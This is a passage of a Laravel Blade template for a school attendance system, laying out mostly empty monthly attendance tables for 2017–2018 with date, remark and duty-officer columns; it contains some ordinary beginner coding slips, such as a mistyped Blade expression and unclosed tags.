@extends('layouts.appp')

@section('content')

<!DOCTYPE html>
<html>

<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>SISTEM ABSENSI REAL TIME</title>

    <!-- Core CSS - Include with every page -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="font-awesome/css/font-awesome.css" rel="stylesheet">

    <!-- Page-Level Plugin CSS - Tables -->
    <link href="css/plugins/dataTables/dataTables.bootstrap.css" rel="stylesheet">

    <!-- SB Admin CSS - Include with every page -->
    <link href="css/sb-admin.css" rel="stylesheet">

</head>

<body>

    <div id="wrapper">

        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h3 class="page-header"><strong> 2017 - 2018</h3>
                </div>
                <!-- /.col-lg-12 -->
            </div>
            <!-- /.row -->
            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
                            {{ Auth::user()->name }} |{{ Auth::user()->name }}| 
                            {{ Auth::user()->name }}                        </div>
                        <!-- /.panel-heading -->
                        <div class="panel-body">
                            <div class="table-responsive">

                            <div class="well">
                                <h4 class="text-center">Tahun 2017</h4>
                            </div>

                                <table class="table table-striped table-bordered table-hover">
  
                                        

@php $no = 1; @endphp
@foreach($absensi_siswa as $data)
                      
<tr>
<td colspan="11" class="text-center info">July</td>
</tr>
<tr>
<td class="success text-center" >Tanggal</td>
<td  colspan="5" class="text-center success">Keterangan</td>
<td  colspan="5" class="text-center success">Petugas Piket</td>

</tr>

<tr><td class="text-center">1</td>

<td colspan="5" class="text-center">{{ $data->keterangan}}</td>

<td colspan="5" class="text-center">{{ $data-id_jurusan>}}</td>

</tr>

<tr class="danger">

<td class="text-center">2</td>


<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">3</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">4</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">5</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">6</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">7</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">8</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">9</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">10</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">11</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">12</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">13</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">14</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">15</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">16</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">17</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">18</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">19</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">20</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">21</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">22</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">23</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">24</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">25</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">26</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">27</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">28</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">29</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">30</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">31</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

</tr>
<tr>
<td colspan="11" class="text-center info">August</td>
</tr>
<tr>
<td class="success text-center" rowspan="2">Tanggal</td>
</tr>
<tr>
<td  colspan="5" class="text-center warning">keterangan
</td>

<td colspan="5" class="text-center warning">petugas piket
</td>

</tr>

<tr><td class="text-center">1</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>

</tr>

<tr><td class="text-center">2</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">3</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">4</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">5</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">6</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">7</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">8</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">9</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">10</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">11</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">12</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">13</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">14</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">15</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">16</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">17</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">18</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">19</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">20</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">21</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">22</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">23</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">24</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">25</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">26</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">27</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">28</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">29</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">30</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">31</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

</tr>
<tr>
<td colspan="11" class="text-center info">September</td>
</tr>
<tr>
<td class="success text-center" rowspan="2">Tanggal</td>
</tr>
<tr>
<td  colspan="5" class="text-center warning">keterangan
</td>

<td colspan="5" class="text-center warning">petugas piket
</td>

</tr>

<tr><td class="text-center">1</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>

</tr>

<tr><td class="text-center">2</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">3</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">4</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">5</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">6</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">7</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">8</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">9</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">10</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">11</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">12</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">13</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">14</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">15</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">16</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">17</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">18</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">19</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">20</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">21</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">22</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">23</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">24</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">25</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">26</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">27</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">28</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">29</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">30</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

</tr>
<tr>
<td colspan="11" class="text-center info">October</td>
</tr>
<tr>
<td class="success text-center" rowspan="2">Tanggal</td>
</tr>
<tr>
<td  colspan="5" class="text-center warning">keterangan
</td>

<td colspan="5" class="text-center warning">petugas piket
</td>

</tr>

<tr class="danger">

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>


<td class="text-center"></td>
</tr>

<tr><td class="text-center">2</td>


<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">3</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">4</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">5</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">6</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">7</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">8</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">9</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">10</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">11</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">12</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">13</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">14</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">15</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">16</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">17</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">18</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">19</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">20</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">21</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">22</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">23</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">24</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">25</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">26</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">27</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">28</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">29</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">30</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">31</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

</tr>
<tr>
<td colspan="11" class="text-center info">November</td>
</tr>
<tr>
<td class="success text-center" rowspan="2">Tanggal</td>
</tr>
<tr>
<td  colspan="5" class="text-center warning">keterangan
</td>

<td colspan="5" class="text-center warning">petugas piket
</td>

</tr>

<tr><td class="text-center">1</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>

</tr>

<tr><td class="text-center">2</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">3</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">4</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">5</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">6</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">7</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">8</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">9</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">10</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">11</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">12</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">13</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">14</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">15</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">16</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">17</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">18</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">19</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">20</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">21</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">22</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">23</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">24</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">25</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">26</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">27</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">28</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">29</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">30</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

</tr>
<tr>
<td colspan="11" class="text-center info">December</td>
</tr>
<tr>
<td class="success text-center" rowspan="2">Tanggal</td>
</tr>
<tr>
<td  colspan="5" class="text-center warning">keterangan
</td>

<td colspan="5" class="text-center warning">petugas piket
</td>

</tr>

<tr><td class="text-center">1</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>

</tr>

<tr><td class="text-center">2</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">3</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">4</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">5</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">6</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">7</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">8</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">9</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">10</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">11</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">12</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">13</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">14</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">15</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">16</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">17</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">18</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">19</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">20</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">21</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">22</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">23</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">24</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">25</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">26</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">27</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">28</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">29</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">30</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">31</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

</tr>
                                </table>

                            </div>







                            <div class="well">
                                <h4 class="text-center">Tahun 2018</h4>
                            </div>


                            <div class="table-responsive">


                                <table class="table table-striped table-bordered table-hover">
  
                                        


<tr>
<td colspan="11" class="text-center info">January</td>
</tr>
<tr>
<td class="success text-center" rowspan="2">Tanggal</td>
</tr>
<tr>
<td  colspan="5" class="text-center warning">keterangan
</td>

<td colspan="5" class="text-center warning">petugas piket
</td>

</tr>

<tr class="danger">

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>


<td class="text-center"></td>
</tr>

<tr><td class="text-center">2</td>


<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">3</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">4</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">5</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">6</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">7</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">8</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">9</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">10</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">11</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">12</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">13</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">14</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">15</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">16</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">17</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">18</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">19</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">20</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">21</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">22</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">23</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">24</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">25</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">26</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">27</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">28</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">29</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">30</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">31</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

</tr>
<tr>
<td colspan="11" class="text-center info">February</td>
</tr>
<tr>
<td class="success text-center" rowspan="2">Tanggal</td>
</tr>
<tr>
<td  colspan="5" class="text-center warning">keterangan
</td>

<td colspan="5" class="text-center warning">petugas piket
</td>

</tr>

<tr><td class="text-center">1</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>

</tr>

<tr><td class="text-center">2</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">3</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">4</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">5</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">6</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">7</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">8</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">9</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">10</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">11</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">12</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">13</td>

<td colspan="5" class="text-center"></td>

